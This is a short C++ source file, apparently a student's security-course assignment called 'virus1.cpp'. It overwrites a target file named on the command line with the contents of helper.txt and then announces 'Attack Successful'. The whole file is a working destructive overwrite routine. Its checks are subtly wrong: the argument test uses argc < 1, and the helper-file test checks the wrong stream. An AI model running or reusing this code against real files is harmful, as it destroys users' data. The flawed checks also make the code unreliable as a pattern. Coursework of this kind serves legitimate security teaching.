// COMP3632 Assignment 1 virus1.cpp
// Dhesant Nakka | 20146587

#include <iostream>
#include <fstream>

int main (int argc, char** argv) {
    // Ensure valid argument
    if (argc < 1) {
	std::cout << "No target specified" << std::endl;
	return 1;
    }

    // Open target
    std::cout << "Opening: " << argv[1] << std::endl;

    std::fstream fs;
    fs.open(argv[1], std::fstream::out | std::fstream::trunc);

    if (!fs.is_open()) {
	std::cout << "File opening failed" << std::endl;
	return 1;
    }

    // Open helper.txt
    std::fstream src;
    src.open("helper.txt", std::fstream::in);

    if (!fs.is_open()) {
	std::cout << "Cannot find helper.txt" << std::endl;
	return 1;
    }
    
    // Get length of helper.txt
    src.seekg(0, src.end);
    int len = src.tellg();
    src.seekg(0);

    // Write to target
    char* buffer = new char[len];

    src.read(buffer, len);
    fs.write(buffer, len);

    delete[] buffer;
    
    // Close everything
    src.close();
    fs.close();
    std::cout << "Attack Successful. Have a nice day!" << std::endl;

    return 0;
}
